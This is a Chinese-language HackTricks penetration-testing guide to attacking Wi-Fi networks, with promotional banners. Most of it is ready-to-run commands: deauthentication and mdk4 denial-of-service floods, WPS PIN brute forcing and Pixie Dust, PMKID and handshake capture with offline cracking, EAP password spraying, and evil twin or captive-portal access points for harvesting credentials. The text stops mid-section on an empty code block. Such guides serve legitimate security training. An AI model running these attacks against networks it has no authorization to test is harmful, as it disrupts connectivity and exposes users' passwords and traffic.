# Wifi渗透测试

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

加入[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)服务器，与经验丰富的黑客和赏金猎人交流！

**黑客见解**\
参与深入探讨黑客行为的刺激和挑战的内容

**实时黑客新闻**\
通过实时新闻和见解及时了解快节奏的黑客世界

**最新公告**\
随时了解最新的赏金计划发布和重要平台更新

**加入我们的** [**Discord**](https://discord.com/invite/N3FrSbmwdy)，立即与顶尖黑客合作！ 

## Wifi基本命令
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
```
## 工具

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon是一个多用途的无线渗透测试工具，它结合了许多无线渗透测试技术，使渗透测试人员能够轻松地执行各种无线网络攻击。
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**使用docker运行airgeddon**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

它可以执行恶意双胞胎、KARMA 和已知信标攻击，然后使用钓鱼模板来获取网络真实密码或捕获社交网络凭证。
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

这个工具自动化了**WPS/WEP/WPA-PSK**攻击。它会自动执行以下操作：

- 将接口设置为监控模式
- 扫描可能的网络 - 并让您选择受害者
- 如果是WEP - 启动WEP攻击
- 如果是WPA-PSK
- 如果是WPS：Pixie dust攻击和暴力破解攻击（请注意，暴力破解攻击可能需要很长时间）。请注意，它不会尝试空PIN或数据库/生成的PIN。
- 尝试捕获AP的PMKID以破解它
- 尝试去认证AP的客户端以捕获握手
- 如果有PMKID或握手，尝试使用top5000密码进行暴力破解。

## 攻击摘要

- **DoS**
  - 拒绝服务
  - 退认证/解关联 - 断开所有人（或特定ESSID/客户端）
  - 随机虚假AP - 隐藏网络，可能导致扫描器崩溃
  - 过载AP - 尝试使AP崩溃（通常不太有用）
  - WIDS - 与IDS玩耍
  - TKIP，EAPOL - 一些特定攻击以拒绝服务一些AP
- **破解**
  - 破解**WEP**（多种工具和方法）
  - **WPA-PSK**
  - **WPS** PIN“暴力破解”
  - **WPA PMKID** 暴力破解
  - \[DoS +] **WPA握手** 捕获 + 破解
  - **WPA-MGT**
  - **用户名捕获**
  - **暴力破解**凭据
  - **恶意双子**（带或不带DoS）
  - **开放**恶意双子\[+ DoS] - 用于捕获强制门户凭据和/或执行局域网攻击
  - **WPA-PSK** 恶意双子 - 如果您知道密码，用于网络攻击
  - **WPA-MGT** - 用于捕获公司凭据
  - **KARMA, MANA**, **Loud MANA**, **已知信标**
  - **+ 开放** - 用于捕获强制门户凭据和/或执行局域网攻击
  - **+ WPA** - 用于捕获WPA握手

## 拒绝服务攻击

### 退认证数据包

进行这种类型攻击最常见的方式是使用**退认证**数据包。这是一种“管理”帧，负责将设备从接入点断开。伪造这些数据包是[黑客入侵许多Wi-Fi网络](https://null-byte.wonderhowto.com/how-to/wi-fi-hacking/)的关键，因为您可以随时强制将任何客户端从网络中断开。这种操作的简便性有些令人恐惧，通常作为收集WPA握手以破解的一部分而执行。

除了短暂使用此断开连接来收集握手以破解外，您还可以让这些退认证持续进行，这样会使客户端看起来被连接到的网络发送退认证数据包。由于这些帧未加密，许多程序通过伪造并将它们发送到网络上的一个或所有设备来利用管理帧。\
**来自** [**这里**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**。**

**使用Aireplay-ng进行退认证**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 表示去认证
* 1 是要发送的去认证次数（如果需要，可以发送多次）；0 表示持续发送
* \-a 00:14:6C:7E:40:80 是接入点的 MAC 地址
* \-c 00:0F:B5:34:30:30 是要去认证的客户端的 MAC 地址；如果省略此项，则发送广播去认证（不总是有效）
* ath0 是接口名称

### 解除关联数据包

解除关联数据包是另一种管理帧类型，用于将节点（指任何设备，如笔记本电脑或手机）与附近的接入点断开连接。去认证帧和解除关联帧之间的主要区别在于它们的使用方式。

当接入点希望断开与恶意设备的连接时，会发送去认证数据包以通知设备已从网络中断开连接，而解除关联数据包用于在接入点关闭电源、重新启动或离开区域时断开任何节点的连接。

**来自** [**此处**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)** 的描述。**

**此攻击可通过 mdk4（模式 "d"）执行：**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **通过 mdk4 进行更多的 DOS 攻击**

**来自** [**这里**](https://en.kali.tools/?p=864)**。**

**攻击模式 b: Beacon Flood 攻击**

发送信标帧以展示虚假的接入点给客户端。这有时会导致网络扫描工具甚至驱动程序崩溃！
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**攻击模式 a: 认证拒绝服务**

向范围内发现的所有接入点发送认证帧。太多客户端可能会冻结或重置多个接入点。
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**攻击模式 p: SSID探测和暴力破解**

探测接入点并检查响应，有助于检查SSID是否已正确解密以及接入点是否在您的发送范围内。还可以使用或不使用字典对隐藏的SSID进行**暴力破解**。

**攻击模式 m: Michael对策利用**

发送随机数据包或在另一个QoS队列上重新注入重复数据包，以引发**TKIP接入点**上的Michael对策。接入点将会关闭一整分钟，使其成为一种有效的**DoS**攻击。
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**攻击模式 e: EAPOL 启动和注销数据包注入**

向接入点（AP）发送大量 EAPOL 启动帧，使其忙于处理虚假会话，从而禁止其处理任何合法客户端。或者通过注入虚假的 EAPOL 注销消息来注销客户端。
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**攻击模式 s: 针对 IEEE 802.11s 网络的攻击**

对网状网络中的链路管理和路由进行各种攻击。淹没邻居和路由，制造黑洞并转移流量！

**攻击模式 w: WIDS 混淆**

通过将客户端交叉连接到多个 WDS 节点或虚假的恶意 AP，混淆/滥用入侵检测和预防系统。
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**攻击模式 f: 数据包模糊器**

一个简单的数据包模糊器，具有多个数据包来源和一组不错的修改器。请小心！

### **Airggedon**

_**Airgeddon**_ 提供了前面评论中提出的大多数攻击：

![](<../../.gitbook/assets/image (126).png>)

## WPS

WPS代表Wi-Fi Protected Setup。这是一种无线网络安全标准，旨在加快和简化路由器与无线设备之间的连接。**WPS仅适用于使用使用**WPA**个人或**WPA2**个人安全协议加密的密码**的无线网络。WPS不适用于使用已弃用的易受任何具有基本工具和技能的黑客轻松破解的WEP安全性的无线网络。 (来自[这里](https://www.digitalcitizen.life/simple-questions-what-wps-wi-fi-protected-setup))

WPS使用8位长度的PIN码允许用户连接到网络，但首先检查前4个数字，如果正确，则再检查后4个数字。然后，可以对前半部分和后半部分进行暴力破解（仅有11000种可能性）。

### WPS暴力破解

有两个主要工具可执行此操作：Reaver和Bully。

* **Reaver**旨在针对WPS进行强大而实用的攻击，并已针对各种接入点和WPS实现进行了测试。
* **Bully**是WPS暴力破解攻击的**新实现**，用C语言编写。它比原始的reaver代码具有几个优点：较少的依赖性，改进的内存和CPU性能，正确处理字节序，以及更强大的选项集。

此攻击利用了**八位WPS PIN码中的一个弱点**；由于这个问题，协议**会泄露有关PIN的前四位数字**的信息，而**最后一位**作为**校验和**，这使得暴力破解WPS AP变得容易。\
请注意，一些设备包括**防暴力破解保护**，通常会**阻止重复尝试攻击的MAC地址**。在这种情况下，此攻击的复杂性会增加，因为您需要在测试PIN时**轮换MAC**地址。

如果找到WPS有效代码，Bully和Reaver都将使用它来发现用于保护网络的WPA/WPA2 PSK，这样您就可以随时连接。
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**智能暴力破解**

与其开始尝试每个可能的PIN码，你应该检查是否有可用的**已发现的用于攻击的AP的PIN码**（取决于制造商MAC地址）和**PIN码软件生成的PIN码**。

- 已知PIN码数据库是为某些制造商的接入点而制作的，已知它们使用相同的WPS PIN码。该数据库包含MAC地址的前三个八位字节和相应PIN码的列表，这些PIN码对于该制造商非常可能。
- 有几种用于生成WPS PIN码的算法。例如，ComputePIN和EasyBox在计算中使用接入点的MAC地址。但是Arcadyan算法还需要设备ID。

### WPS Pixie Dust攻击

Dominique Bongard发现一些AP存在生成**随机数**（称为**E-S1**和**E-S2**）的弱方法，这些随机数应该是秘密的。如果我们能够弄清楚这些随机数是什么，我们就可以轻松找到AP的WPS PIN码，因为AP必须以哈希的形式将其提供给我们，以证明它也知道PIN码，而客户端没有连接到伪造的AP。这些E-S1和E-S2本质上是“打开包含WPS PIN码的锁盒”的“钥匙”。更多信息请参阅：[https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))

基本上，一些实现在使用随机密钥加密PIN码的2部分时出现了问题（因为在认证通信期间将其分解为2部分并发送给客户端），因此可以使用离线攻击来暴力破解有效的PIN码。
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
### 空 Pin 攻击

一些非常糟糕的实现允许使用空 Pin 连接（非常奇怪）。Reaver 可以测试这一点（Bully 无法）。
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

所有提出的WPS攻击都可以通过 _**airgeddon**_ 轻松执行。

![](<../../.gitbook/assets/image (124).png>)

* 步骤 5 和 6 允许您尝试 **自定义PIN**（如果有的话）
* 步骤 7 和 8 执行 **Pixie Dust 攻击**
* 步骤 13 允许您测试 **NULL PIN**
* 步骤 11 和 12 将从可用数据库中 **重新收集与所选AP相关的PIN** 并使用 ComputePIN、EasyBox 和可选的 Arcadyan（推荐，为什么不呢？）生成可能的 **PIN**
* 步骤 9 和 10 将测试 **每个可能的PIN**

## **WEP**

如此脆弱和消失，我不打算谈论它。只需知道 _**airgeddon**_ 有一个名为“全能”的 WEP 选项来攻击这种保护。更多工具提供类似选项。

![](<../../.gitbook/assets/image (125).png>)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

加入 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 服务器，与经验丰富的黑客和赏金猎人交流！

**黑客见解**\
参与深入探讨黑客的刺激和挑战的内容

**实时黑客新闻**\
通过实时新闻和见解了解快节奏的黑客世界

**最新公告**\
了解最新的赏金任务发布和重要平台更新

**加入我们的** [**Discord**](https://discord.com/invite/N3FrSbmwdy) 并开始与顶尖黑客合作！

## WPA/WPA2 PSK

### PMKID

2018年，hashcat作者[披露](https://hashcat.net/forum/thread-7717.html)了一种新型攻击，不仅依赖于**单个数据包**，而且不需要任何客户端连接到我们的目标AP，只需攻击者与AP之间的通信。

事实证明，**许多**现代路由器在关联时在AP本身发送的**第一个EAPOL**帧末尾附加了一个**可选字段**，称为`Robust Security Network`，其中包括称为`PMKID`的内容。

正如原始帖子中所解释的那样，**PMKID**是通过使用我们已知的数据派生出来的：
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
**由于“PMK Name”字符串是恒定的，我们知道AP和站点的BSSID以及`PMK`是从完整的4次握手中获得的相同的PMK**，这就是hashcat破解PSK并恢复密码所需的全部信息！\
从[这里](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)获取的描述。

要**收集**这些信息并在本地**暴力破解**密码，您可以执行：
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
捕获到的**PMKIDs**将显示在**控制台**中，并且也会**保存**在 **/tmp/attack.pcap** 文件中\
现在，将捕获的内容转换为**hashcat/john**格式并进行破解：
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
请注意，正确的哈希格式包含**4个部分**，如：_4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7\*566f6461666f6f6e65436f6e6e6563743034383131343838_\
\_\_如果您的哈希值**只包含3个部分**，那么它是**无效的**（PMKID捕获无效）。

请注意，`hcxdumptool`**也会捕获握手**（类似于这样的内容：**`MP:M1M2 RC:63258 EAPOLTIME:17091`**）。您可以使用`cap2hccapx`将**握手**转换为**hashcat**/**john**格式。
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
### 握手捕获

攻击**WPA/WPA2**网络的一种方法是捕获**握手**，然后尝试**离线破解**使用的密码。为此，您需要找到**受害者**网络的**BSSID**和**信道**，以及连接到网络的**客户端**。\
一旦您获得这些信息，您就需要开始**监听**该**信道**中**BSSID**的所有通信，希望握手会被发送到那里：
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
现在，您需要**使客户端****去认证**几秒钟，这样它将自动重新认证到AP（请阅读DoS部分，找到几种使客户端去认证的方法）:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, not always work
```
_注意，由于客户端被去认证，它可能会尝试连接到另一个接入点，或者在其他情况下，连接到另一个网络。_

一旦在 `airodump-ng` 中出现一些握手信息，这意味着握手已被捕获，您可以停止监听：

![](<../../.gitbook/assets/image (172) (1).png>)

一旦握手被捕获，您可以使用 `aircrack-ng` **破解** 它：
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### 检查文件中是否存在握手信息

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_如果此工具在找到完整握手之前找到了 ESSID 的不完整握手，则不会检测到有效的握手。_

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA企业（MGT）**

**重要的是谈论企业Wifi可能使用的不同认证方法。对于这种类型的Wifi，您可能会在`airodump-ng`中找到类似以下内容：**
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
**EAP**（可扩展认证协议）是**认证通信**的**核心**，在此基础上，服务器使用**认证算法**对**客户端**（**请求者**）进行认证，有时也由客户端对服务器进行认证。\
在此情况下主要使用的认证算法有：

- **EAP-GTC：**是一种EAP方法，支持使用硬件令牌和一次性密码与EAP-PEAP一起使用。其实现类似于MSCHAPv2，但不使用对等挑战。相反，密码以**明文**形式发送到接入点（对于降级攻击非常有趣）。
- **EAP-MD-5（消息摘要）：**客户端发送密码的MD5哈希。**不推荐使用**：易受字典攻击，没有服务器认证，也无法生成每个会话的有线等效隐私（WEP）密钥。
- **EAP-TLS（传输层安全）：**依赖于**客户端和服务器端证书**进行认证，并可用于动态生成基于用户和会话的WEP密钥以保护随后的通信。
- **EAP-TTLS（隧道传输层安全）：**通过加密通道（或隧道）实现客户端和网络的**相互认证**，以及派生动态的、每个用户、每个会话的WEP密钥。与EAP-TLS不同，**EAP-TTLS仅需要服务器端证书（客户端将使用凭据）**。
- **PEAP（受保护的可扩展认证协议）：**PEAP类似于**EAP**协议，但创建了一个**TLS隧道**来保护通信。然后，可以在EAP之上使用弱认证协议，因为它们将受到隧道的保护。
- **PEAP-MSCHAPv2：**也称为**PEAP**，因为它被广泛采用。这只是在PEAP之上的易受攻击的挑战/响应称为MSCHAPv2（它受到TLS隧道的保护）。
- **PEAP-EAP-TLS或PEAP-TLS：**与**EAP-TLS**非常相似，但在交换证书之前创建了一个TLS隧道。

您可以在[这里](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol)和[这里](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html)找到有关这些认证方法的更多信息。

### 用户名捕获

阅读[https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27)看起来，如果您正在使用**EAP**，则必须支持**“身份”** **消息**，并且**用户名**将在**“响应身份”**消息中以**明文**形式发送。

即使使用最安全的认证方法之一：**PEAP-EAP-TLS**，也可以**捕获在EAP协议中发送的用户名**。为此，**捕获认证通信**（在一个信道内启动`airodump-ng`，在同一接口上启动`wireshark`），并通过`eapol`过滤数据包。\
在“**响应，身份**”数据包中，将显示客户端的**用户名**。

![](<../../.gitbook/assets/image (150).png>)

### 匿名身份

EAP-PEAP和EAP-TTLS都支持身份隐藏。在WiFi网络的上下文中，接入点（AP）通常在关联过程中启动EAP-Identity请求。为确保用户匿名性的保护，用户设备上的EAP客户端的响应仅包含初始RADIUS服务器处理请求所需的基本信息。通过以下场景说明了这一概念：

- EAP-Identity = 匿名

在这种情况下，所有用户都使用伪名“匿名”作为其用户标识符。初始RADIUS服务器充当EAP-PEAP或EAP-TTLS服务器，负责管理PEAP或TTLS协议的服务器端。然后，内部（受保护的）认证方法要么在本地处理，要么委托给远程（家庭）RADIUS服务器。

- EAP-Identity = 匿名@realm_x

在这种情况下，来自不同领域的用户隐藏其身份，同时指示各自的领域。这使初始RADIUS服务器能够将EAP-PEAP或EAP-TTLS请求代理到其家庭领域中的RADIUS服务器，后者充当PEAP或TTLS服务器。初始RADIUS服务器仅充当RADIUS中继节点。

或者，初始RADIUS服务器可以充当EAP-PEAP或EAP-TTLS服务器，并处理受保护的认证方法或将其转发到另一台服务器。此选项便于为不同领域配置不同策略。

在EAP-PEAP中，一旦PEAP服务器和PEAP客户端之间建立了TLS隧道，PEAP服务器会发起EAP-Identity请求，并通过TLS隧道传输。客户端通过发送包含用户真实身份的EAP-Identity响应来响应这个第二个EAP-Identity请求，通过加密隧道传输。这种方法有效地防止了任何窃听802.11流量的人揭示用户的实际身份。

EAP-TTLS遵循略有不同的过程。使用EAP-TTLS，客户端通常使用PAP或CHAP进行身份验证，由TLS隧道保护。在这种情况下，客户端在隧道建立后发送的初始TLS消息中包含用户名属性和密码或CHAP-密码属性。

无论选择哪种协议，PEAP/TTLS服务器在建立TLS隧道后都会获知用户的真实身份。真实身份可以表示为用户@领域或简单地用户。如果PEAP/TTLS服务器还负责对用户进行身份验证，则现在拥有用户的身份，并继续使用TLS隧道保护的身份验证方法。或者，PEAP/TTLS服务器可以向用户的家庭RADIUS服务器转发新的RADIUS请求。这个新的RADIUS请求省略了PEAP或TTLS协议层。在受保护的认证方法是EAP的情况下，内部EAP消息将被传输到家庭RADIUS服务器，而不包含EAP-PEAP或EAP-TTLS包装。传出RADIUS消息的User-Name属性包含用户的真实身份，替换了传入RADIUS请求中的匿名User-Name。当受保护的认证方法是PAP或CHAP（仅由TTLS支持）时，从TLS负载中提取的User-Name和其他身份验证属性将替换传入RADIUS请求中找到的匿名User-Name和TTLS EAP-Message属性。

有关更多信息，请查看[https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-暴力破解（密码喷洒）

如果客户端预计使用**用户名和密码**（请注意，在这种情况下**EAP-TLS将无效**），则可以尝试获取**用户名列表**（请参见下一部分）和**密码**，并尝试使用[**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)****进行访问的**暴力破解**。
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
您也可以使用 `eaphammer` 进行此攻击：
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## 客户端攻击理论

### 网络选择和漫游

尽管 802.11 协议有非常具体的规则规定了一个站点如何加入一个 ESS，但它并没有规定站点应该如何选择要连接的 ESS。此外，该协议允许站点在共享相同 ESSID 的接入点之间自由漫游（因为你不希望在从建筑物的一端走到另一端时失去 WiFi 连接等）。然而，802.11 协议并未规定应如何选择这些接入点。此外，尽管站点必须经过身份验证才能与接入点关联，但 802.11 协议并不要求接入点对站点进行身份验证。

### 首选网络列表（PNLs）

每次站点连接到无线网络时，网络的 ESSID 会存储在站点的首选网络列表（PNL）中。PNL 是站点过去连接过的每个网络的有序列表，PNL 中的每个条目包含网络的 ESSID 和建立连接所需的任何网络特定配置信息。

### 被动扫描

在基础设施网络中，接入点定期发送信标帧以向附近的站点广告其存在和能力。信标是广播帧，这意味着它们旨在被范围内所有附近的站点接收。信标包括有关 AP 支持的速率、加密能力、附加信息，最重要的是，信标帧包含 AP 的 ESSID（只要 ESSID 广播未禁用）。

在被动扫描期间，客户端设备会监听附近接入点发送的信标帧。如果客户端设备收到一个 ESSID 字段与客户端的 PNL 中的 ESSID 匹配的信标帧，则客户端将自动连接到发送信标帧的接入点。然后，假设我们想要针对一个当前未连接到任何无线网络的无线设备。如果我们至少知道该客户端的 PNL 中的一个条目，我们可以通过创建具有该条目的 ESSID 的自己的接入点，强制客户端连接到我们。

### 主动探测

802.11 中使用的第二种网络选择算法称为主动探测。使用主动探测的客户端设备会持续发送探测请求帧，以确定范围内有哪些 AP，以及它们的能力是什么。探测请求有两种形式：定向和广播。定向探测请求是寻址到特定 ESSID 的，是客户端检查特定网络是否附近的方式。

使用定向探测的客户端会为其 PNL 中的每个网络发送探测请求。值得注意的是，定向探测是唯一的方式来识别附近隐藏网络的存在。广播探测请求工作方式几乎完全相同，但是将 SSID 字段设置为 NULL。这将广播探测请求发送到所有附近的接入点，允许站点检查其附近是否有任何首选网络，而不会透露其 PNL 的内容。

## 简单的具有重定向到互联网的 AP

在解释如何执行更复杂的攻击之前，将解释如何仅创建一个 AP 并将其流量重定向到连接到互联网的接口。

使用 `ifconfig -a` 检查要创建 AP 的 wlan 接口和连接到互联网的接口是否存在。

### DHCP 和 DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
创建一个配置文件 _/etc/dnsmasq.conf_，内容如下：
```
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
然后**设置IP**和**路由**：
```
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
然后 **启动** dnsmasq：
```
dnsmasq -C dnsmasq.conf -d
```
### hostapd

### hostapd
```
apt-get install hostapd
```
创建一个配置文件 _hostapd.conf:_
```
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**停止烦人的进程**，设置**监视模式**，然后**启动hostapd**：
```
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### 转发和重定向
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## 恶意孪生者

恶意孪生者攻击是一种利用大多数计算机和手机只能看到无线网络的“名称”或ESSID（因为基站不需要对客户端进行身份验证）的Wi-Fi攻击类型。这实际上使得很难区分具有相同名称和相同加密类型的网络。事实上，许多网络将有多个扩展网络访问点，所有这些访问点都使用相同的名称来扩展访问，而不会让用户感到困惑。

由于客户端的实现方式（请记住，802.11协议允许站点在同一ESS内的访问点之间自由漫游），可以使设备更改连接的基站。可以通过提供更好的信号（这并非总是可能的）或通过阻止对原始基站的访问（去认证数据包，干扰，或其他形式的DoS攻击）来实现这一点。

还要注意，现实世界中的无线部署通常不止一个访问点，这些访问点通常更强大，并且由于其朝向天花板的位置而具有更好的视距范围。去认证单个访问点通常会导致目标漫游到另一个有效的访问点，而不是您的恶意AP，除非附近的所有访问点都被去认证（大声）或您对恶意AP的放置非常小心（困难）。

您可以创建一个非常基本的开放式恶意孪生者（没有将流量路由到互联网的功能）：
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
您还可以使用**eaphammer**创建一个恶意双子（请注意，要使用eaphammer创建恶意双子，接口**不应该**处于**监控**模式）:
```
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
或者使用Airgeddon：`选项：5,6,7,8,9（在恶意双胞胎攻击菜单中）。`

![](<../../.gitbook/assets/image (148).png>)

请注意，默认情况下，如果PNL中保存的ESSID受到WPA保护，设备不会自动连接到一个开放的恶意双胞胎。您可以尝试对真实AP进行DoS攻击，并希望用户手动连接到您的开放恶意双胞胎，或者您可以对真实AP进行DoS攻击并使用WPA恶意双胞胎来捕获握手（使用此方法，您将无法让受害者连接到您，因为您不知道PSK，但您可以捕获握手并尝试破解它）。

_一些操作系统和防病毒软件会警告用户连接到开放网络是危险的..._

### WPA/WPA2恶意双胞胎

您可以创建一个**使用WPA/2的恶意双胞胎**，如果设备已配置为使用WPA/2连接到该SSID，它们将尝试连接。无论如何，**要完成4次握手**，您还需要**知道**客户端将使用的**密码**。如果您**不知道**它，**连接将无法完成**。
```
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### 企业级恶意双胞胎

要了解这些攻击，我建议先阅读简要的[WPA企业解释](./#wpa-enterprise-mgt)。

**使用hostapd-wpe**

`hostapd-wpe`需要一个**配置**文件才能工作。要**自动化**生成这些配置，您可以使用[https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad)（下载python文件到 _/etc/hostapd-wpe/_）。
```
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
在配置文件中，您可以选择许多不同的内容，如SSID、频道、用户文件、证书/密钥、DH参数、WPA版本和认证...

[**使用hostapd-wpe与EAP-TLS，允许任何证书登录。**](evil-twin-eap-tls.md)

**使用EAPHammer**
```bash
